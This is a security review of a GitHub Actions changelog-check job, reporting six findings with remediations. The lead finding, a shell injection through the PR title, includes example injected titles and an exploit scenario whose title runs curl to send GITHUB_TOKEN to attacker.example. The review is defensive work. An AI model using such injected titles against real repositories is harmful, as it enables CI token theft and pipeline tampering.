# DevSecOps Security Review: `changelog-check` CI Job

**Reviewer:** eng-devsecops
**Date:** 2026-03-09
**Target:** `.github/workflows/ci.yml` — `changelog-check` job (lines 536-572) and its wiring into `ci-success` (lines 579-633)
**Branch:** fix/proj-030-bugs

---

## Document Sections

| Section | Purpose |
|---------|---------|
| [L0 Executive Summary](#l0-executive-summary) | Total findings, pipeline health, critical blockers |
| [L1 Technical Detail](#l1-technical-detail) | Per-finding analysis with evidence and remediation |
| [L2 Strategic Implications](#l2-strategic-implications) | Pattern assessment, coverage gaps, recommendations |

---

## L0 Executive Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 0 |
| HIGH | 1 |
| MEDIUM | 2 |
| LOW | 1 |
| INFO | 2 |
| **Total** | **6** |

**Pipeline health:** The `changelog-check` job has one HIGH-severity shell injection vector that must be remediated before this code reaches a public repository with external contributors. The `ci-success` gate wiring is correct. SHA-pinning is consistent with the rest of the pipeline. No CRITICAL findings.

**Blocking finding:** `CLCHK-001` (HIGH) — PR title injected directly into shell via `${{ github.event.pull_request.title }}` without sanitization.

---

## L1 Technical Detail

### CLCHK-001 — Shell Injection via PR Title (HIGH)

**Location:** `ci.yml` line 554

```yaml
PR_TITLE="${{ github.event.pull_request.title }}"
if [[ "$PR_TITLE" == *"[skip-changelog]"* ]]; then
```

**Description:** `${{ github.event.pull_request.title }}` is an attacker-controlled value set by the PR author. GitHub Actions evaluates `${{ ... }}` expressions at workflow YAML rendering time — before the runner hands the script to bash. This means the PR title is string-interpolated into the bash script source before bash parses it.

An external contributor can set the PR title to a value containing shell metacharacters. Examples that would execute arbitrary commands:

- Title: `fix: thing $(exit 0)` — causes the bash process to exit 0, bypassing the changelog check entirely.
- Title: `fix: thing \`exit 0\`` — backtick form of the same attack.
- Title: `fix: [skip-changelog] $(malicious_command)` — skips the check and executes a command.

Because this job runs with `contents: read` and `pull-requests: write` permissions, and GitHub Actions runners have access to `GITHUB_TOKEN` in the environment, successful injection could allow an attacker to exfiltrate the token or post comments via the API using the workflow's identity.

**Exploit scenario:**
1. External contributor forks the repo.
2. Opens a PR with title: `chore: update deps $(curl -s https://attacker.example/exfil -d "$GITHUB_TOKEN")`
3. The changelog-check job executes this curl command with the repository's `GITHUB_TOKEN`.

**Remediation:** Pass the PR title through the `env:` block instead of direct `${{ }}` interpolation. Values set via `env:` are passed to the shell as environment variables — bash receives them as data, not as code.

```yaml
- name: Check CHANGELOG.md was updated
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    ACTOR: ${{ github.actor }}
  run: |
    # Exempt bot PRs and [skip-changelog] marker
    if [[ "$ACTOR" == "dependabot[bot]" ]] || \
       [[ "$ACTOR" == "github-actions[bot]" ]]; then
      echo "Bot PR — changelog check skipped."
      exit 0
    fi

    if [[ "$PR_TITLE" == *"[skip-changelog]"* ]]; then
      echo "PR title contains [skip-changelog] — check skipped."
      exit 0
    fi

    BASE_SHA="${{ github.event.pull_request.base.sha }}"
    if git diff --name-only "$BASE_SHA"...HEAD | grep -q '^CHANGELOG.md$'; then
      echo "CHANGELOG.md updated. OK."
    else
      echo "::error::CHANGELOG.md was not updated in this PR."
      echo ""
      echo "Every PR must include a changelog entry in the [Unreleased] section."
      echo "See CHANGELOG.md for format (Keep a Changelog)."
      echo ""
      echo "To skip this check (e.g., CI-only changes), add [skip-changelog] to the PR title."
      exit 1
    fi
```

Note that `github.actor` in the inline comparison at lines 548-549 is also moved to `env:` in this remediation. While `github.actor` is lower risk than the PR title (it is only alphanumeric, `-`, `[`, `]`, and `.`), applying `env:` uniformly is the correct defensive pattern and prevents this injection class from ever appearing here.

**Note on `BASE_SHA`:** The `github.event.pull_request.base.sha` value is guaranteed by GitHub to be a 40-character hex string `[0-9a-f]{40}`. It does not need `env:` for safety, but moving it there is consistent style. If left inline, it remains safe.

**References:** [GitHub Security Hardening: Script Injection](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)

---

### CLCHK-002 — `[skip-changelog]` Bypass is Available to All PR Authors (MEDIUM)

**Location:** `ci.yml` lines 554-558

```yaml
PR_TITLE="${{ github.event.pull_request.title }}"
if [[ "$PR_TITLE" == *"[skip-changelog]"* ]]; then
  echo "PR title contains [skip-changelog] — check skipped."
  exit 0
fi
```

**Description:** Any contributor who can open a PR can add `[skip-changelog]` to the PR title and completely bypass the changelog enforcement. There is no branch protection rule, CODEOWNER approval gate, or label-based mechanism that restricts who can use this escape hatch.

This is a policy-level weakness, not a code defect. The escape hatch is intentionally designed and documented. However, it means the enforcement guarantee is only as strong as contributor discipline. A contributor who wants to merge a PR without updating the changelog simply titles it `[skip-changelog]: actual title`.

**Risk context:** If the project relies on CHANGELOG.md for release note generation or compliance, this bypass undermines that guarantee for all external (fork-based) PRs. For an internal team with trusted contributors, the risk is low. For a public open-source repo with external contributors, the risk is higher.

**Remediation options (choose based on trust model):**
1. **No change (accepted risk):** Document the bypass as intentional and trusted-contributor-only. Add a CODEOWNER rule or branch protection requiring maintainer review on PRs that use `[skip-changelog]`.
2. **Label-based bypass:** Replace title-based bypass with a label (`skip-changelog` label applied only by maintainers). This restricts bypass to those with `write` permission on the repo. Requires a different check mechanism (e.g., `github.event.pull_request.labels[*].name`).
3. **Require explicit maintainer approval for bypass:** Keep the title escape hatch but add a required reviewer check for PRs using it.

---

### CLCHK-003 — `ci-success` Changelog Gate Accepts `skipped` but Not `cancelled` (MEDIUM)

**Location:** `ci.yml` lines 614-618

```yaml
CHANGELOG_RESULT="${{ needs.changelog-check.result }}"
if [[ "$CHANGELOG_RESULT" != "success" && "$CHANGELOG_RESULT" != "skipped" ]]; then
  echo "changelog-check failed: $CHANGELOG_RESULT"
  exit 1
fi
```

**Description:** The `ci-success` gate for `changelog-check` allows both `"success"` and `"skipped"`. On push events (not PRs), `changelog-check` is skipped because of `if: github.event_name == 'pull_request'` — this is correct behavior and the `"skipped"` allowance is necessary.

However, the condition is asymmetric with the other 11 jobs in the same gate, all of which require `"success"` only (lines 587-597). The `changelog-check` job is the only one with special skip handling, but a `"cancelled"` result from `changelog-check` would also fail the gate (correctly). This is secure-by-default behavior.

The actual medium-severity issue is: this two-path handling (check inside the `ci-success` step for `skipped` vs. unconditional `success` for others) creates a divergent maintenance pattern. If a future developer adds another PR-only job, they may model after the earlier jobs and forget the `skipped` handling, creating a gate that permanently fails on push events.

**Remediation:** Add a comment in the `ci-success` step documenting the pattern:

```yaml
# Jobs with 'if: github.event_name == ''pull_request''' will be "skipped" on push.
# These require success-OR-skipped handling below. Currently: changelog-check, coverage-report.
# Jobs without event filter must be "success" unconditionally.
```

Also note: `coverage-report` is in `needs:` for `ci-success` (line 582 — verify this), and it too has `if: github.event_name == 'pull_request'`. If `coverage-report` is in `needs:`, it requires the same `skipped` handling that `changelog-check` gets.

**Verification check for `coverage-report`:** Looking at line 582, `coverage-report` is NOT in the `needs:` list for `ci-success`. The `needs:` list is: `lint, type-check, security, plugin-validation, template-validation, license-headers, cli-integration, test-pip, test-uv, version-sync, hard-rule-ceiling, changelog-check`. `coverage-report` is absent — this is intentional (it is informational, not a gate). The asymmetry is scoped to `changelog-check` only, but the documentation gap remains.

---

### CLCHK-004 — Bot Exemption List is Incomplete (LOW)

**Location:** `ci.yml` lines 548-552

```yaml
if [[ "${{ github.actor }}" == "dependabot[bot]" ]] || \
   [[ "${{ github.actor }}" == "github-actions[bot]" ]]; then
  echo "Bot PR — changelog check skipped."
  exit 0
fi
```

**Description:** The bot exemption covers only `dependabot[bot]` and `github-actions[bot]`. Other common automated actors that could legitimately open PRs without changelog updates include:

- `renovate[bot]` — Renovate dependency update bot
- `release-please[bot]` — Google's release automation
- `semantic-release-bot` — Semantic release automation
- Any custom bot with a `[bot]` username the project adds later

If any of these bots are adopted, their PRs will fail the changelog check. This is a policy gap, not a security weakness. The current behavior is safe (conservative: unknown bots are blocked, not exempted).

**Remediation:** Add a pattern match for the `[bot]` suffix to catch all bot actors, or maintain an explicit allowlist if tighter control is desired:

```bash
# Option A: pattern-match all GitHub bot actors
if [[ "$ACTOR" == *"[bot]" ]]; then
  echo "Bot actor — changelog check skipped."
  exit 0
fi

# Option B: explicit allowlist (more controlled)
if [[ "$ACTOR" == "dependabot[bot]" ]] || \
   [[ "$ACTOR" == "github-actions[bot]" ]] || \
   [[ "$ACTOR" == "renovate[bot]" ]] || \
   [[ "$ACTOR" == "release-please[bot]" ]]; then
  echo "Bot PR — changelog check skipped."
  exit 0
fi
```

Option A is broader and easier to maintain. Option B is more explicit but requires updates as new bots are adopted. For a security-conscious posture, Option B is preferable: unknown bots should be required to explain their absence of changelog entries via `[skip-changelog]`, not automatically exempted.

---

### CLCHK-005 — `fetch-depth: 0` is Correct but Worth Documenting (INFO)

**Location:** `ci.yml` lines 541-543

```yaml
- uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0
  with:
    fetch-depth: 0
```

**Description:** `fetch-depth: 0` fetches the full git history, which is required for `git diff ... BASE_SHA...HEAD` to work correctly. Without it, the checkout is a shallow clone and the base SHA may not be present in the local repository, causing the `git diff` command to fail with `fatal: ambiguous argument`.

This is correct and necessary. It is called out here because it represents a modest performance cost (fetching full history can be slow on large repositories with deep history) and because it is the only job in the pipeline that uses `fetch-depth: 0`. A comment in the YAML explaining why it is needed would prevent a future developer from removing it during a cleanup pass.

**Suggestion:** Add an inline comment:

```yaml
- uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0
  with:
    fetch-depth: 0  # Required: git diff needs full history to resolve BASE_SHA
```

---

### CLCHK-006 — SHA-Pinning is Consistent with the Rest of the Pipeline (INFO)

**Location:** `ci.yml` line 541

```yaml
- uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0
```

**Description:** The `changelog-check` job uses the same pinned SHA for `actions/checkout` as every other job in the pipeline. The job uses no additional actions beyond checkout — it relies only on runner-native `git` and `bash`. This is the minimal-action-footprint pattern and reduces supply-chain attack surface.

No additional actions need SHA-pinning. This is a finding confirming conformance, not a defect.

---

## L2 Strategic Implications

### Shell Injection Pattern Prevalence

The shell injection vector identified in CLCHK-001 is the most common CI security weakness in GitHub Actions pipelines. The pattern `run: ... "${{ github.event.pull_request.title }}"` appears in countless public workflows. The remediation (using `env:` blocks) is well-documented in GitHub's security hardening guide but underused in practice.

The rest of `ci.yml` does not exhibit this pattern — the only other `${{ ... }}` interpolations in `run:` blocks are matrix variables (`${{ matrix.python-version }}`, `${{ matrix.os }}`), job result references (`${{ needs.*.result }}`), and secrets references (`${{ secrets.CODECOV_TOKEN }}`). Matrix variables are controlled by the workflow author (not the PR author), job results are trusted GitHub-computed values, and secrets are never user-controllable. The `changelog-check` job is the only location where untrusted user input reaches a `run:` block.

**Tool recommendation:** The existing `security` job in this pipeline runs `pip-audit` and a YAML API grep check. Adding a GitHub Actions-specific linter such as `zizmor` or `actionlint` as an additional security step would catch this class of injection automatically. `actionlint` specifically detects untrusted `${{ }}` expressions in `run:` steps.

### Bypass Escape Hatch Design

The `[skip-changelog]` title-based bypass (CLCHK-002) is a pragmatic choice for a small team. The risk is proportional to the trust level of contributors. For a private or team-internal repository, this is acceptable. For a public repo where external contributors can open PRs, the bypass should be restricted to maintainers via a label mechanism.

If the project is moving toward more external contribution (open source), the label-based approach is the recommended upgrade path. GitHub branch protection rules can require that the `skip-changelog` label is applied only by users with `write` access.

### SLSA Build Integrity Assessment

The `changelog-check` job does not produce build artifacts and does not affect supply chain provenance. Its SLSA relevance is limited to the CI gate integrity dimension: if the check can be bypassed, the changelog may not reflect the actual state of the release, which degrades the accuracy of release metadata. CLCHK-001 (shell injection) is the primary SLSA-relevant finding because successful exploitation could tamper with CI behavior.

At the current SLSA Level 1 posture (automated build with documentation), the changelog check adds process integrity value. Remediation of CLCHK-001 is required before this job can be considered a trustworthy process gate.

### Recommended Remediation Priority

| Priority | Finding | Action | Effort |
|----------|---------|--------|--------|
| 1 | CLCHK-001 (HIGH) | Move `PR_TITLE` and `ACTOR` to `env:` block | 5 min |
| 2 | CLCHK-002 (MEDIUM) | Document bypass policy; evaluate label-based approach | 30 min |
| 3 | CLCHK-003 (MEDIUM) | Add comment documenting PR-only skip pattern | 5 min |
| 4 | CLCHK-005 (INFO) | Add inline comment explaining `fetch-depth: 0` | 2 min |
| 5 | CLCHK-004 (LOW) | Decide bot exemption policy; update allowlist | 15 min |

CLCHK-001 should be fixed before this PR is merged. All others are improvements that can be addressed in follow-up work.
